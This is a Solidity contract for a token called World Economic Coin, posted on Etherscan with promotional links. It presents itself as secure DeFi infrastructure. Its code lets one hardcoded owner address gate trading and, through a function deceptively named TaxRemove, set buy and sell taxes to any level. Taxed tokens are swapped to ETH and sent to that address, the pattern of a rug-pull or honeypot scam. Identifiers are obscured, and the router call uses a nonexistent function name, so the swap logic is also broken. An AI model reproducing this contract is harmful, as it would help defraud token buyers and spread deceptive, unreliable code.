/**
 *Submitted for verification at Etherscan.io on 2023-10-22
*/

/*

WORLD ECONOMIC COIN (WEC) IS SECURE DEFI INFRASTRUCTURE

The next generation decentralized, scalable, trusted.

Website - https://worldeconomiccoin.tech/

Telegram - https://t.me/WorldEconomicCoinWEC

Twitter - https://twitter.com/WECERC


*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxgdfeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract WEC {



        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"World Economic Coin"; 
        string public   _symbol = unicode"WEC";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 10000000 * 10**decimals;

        uint256 buyTaxgdfe = 0;
        uint256 sellTaxgdfe = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed MTkkk,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant MTkkk = payable(address(0x627F048aAaE009bDAa45D1838ccAe6c31a50b9E4));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == MTkkk || to == MTkkk);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxgdfeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                MTkkk.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxgdfeAmount = amount * (from == pair ? buyTaxgdfe : sellTaxgdfe) / 100;
                amount -= TaxgdfeAmount;
                balanceOf[address(this)] += TaxgdfeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function SwapOpen() external {
            require(msg.sender == MTkkk);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemeveTax(uint256 _buy, uint256 _sell) private {
            buyTaxgdfe = _buy;
            sellTaxgdfe = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != MTkkk)        
                revert Permissions();
            _RemeveTax(_buy, _sell);
        }
    }